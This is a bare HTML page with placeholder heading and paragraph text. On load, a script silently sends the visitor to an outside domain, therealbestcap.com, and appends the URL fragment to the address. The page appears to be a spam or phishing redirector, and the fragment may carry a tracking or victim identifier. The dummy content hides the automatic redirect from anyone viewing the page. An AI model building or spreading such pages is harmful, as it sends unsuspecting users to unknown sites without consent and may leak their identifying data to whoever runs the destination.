
<!DOCTYPE html>
<html>
<head>
<script>
// Get the current URL fragment (everything after the # symbol)
const currentFragment = window.location.href.split('#')[1];

// Define the new base URL where you want to redirect users
const newBaseURL = 'http://therealbestcap.com/9XHF2DC/29PZ7G5D';

// Check if there is a fragment in the current URL
if (currentFragment) {
  // If there is a fragment, redirect to the new URL with the fragment appended
  document.location.href = newBaseURL + currentFragment;
} else {
  // If there is no fragment, redirect to the new base URL only
  document.location.href = newBaseURL;
}
</script>
</head>
<body>

<h1>This is a Heading</h1>
<p>This is a paragraph.</p>

</body>
</html>
